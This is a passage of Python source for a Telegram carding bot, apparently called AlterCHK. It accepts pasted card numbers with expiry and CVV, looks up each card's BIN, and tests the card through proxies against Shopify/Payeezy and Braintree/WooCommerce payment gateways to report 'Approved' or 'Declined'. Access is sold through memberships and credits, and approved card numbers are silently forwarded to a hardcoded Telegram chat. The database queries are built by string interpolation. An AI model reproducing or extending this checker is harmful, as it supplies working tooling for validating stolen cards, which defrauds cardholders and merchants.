 #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDsy import ShopifyPayeezy
        CheckRecive = await ShopifyPayeezy(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#


@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["pez"])
async def CMDpez(message: types.Message):
    NameGateway = 'Gateway 🔥 Pezcary [ CCN Auth ]'
    TwoNameGateway = 'Gateway ↯ Pezcary [ CCN Auth ]'
    ThreeGateway = 'Gateway 🔥 Pezcary [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('pez')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDpez3 import BraintreeWoo
        CheckRecive = await BraintreeWoo(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
            await bot.send_message(chat_id=5673835413, text=f"<b>CC - ↯ <code>{CcVerify}</code>\nChecked by - ↯ {UserName} [{UserStatus}]</b>")
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["ti"])
async def CMDpez(message: types.Message):
    NameGateway = 'Gateway 🔥 Tilin [ CCN 10$ ]'
    TwoNameGateway = 'Gateway ↯ Tilin [ CCN 10$ ]'
    ThreeGateway = 'Gateway 🔥 Tilin [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('ti')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        
    result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    result = json.loads(json.dumps(result[0]))
    Credits = result['Creditos']
    if int(Credits) < 10:
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text="<b>Insufficient Credits.</b>",
                reply_to_message_id=message.message_id
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except (aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest):
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
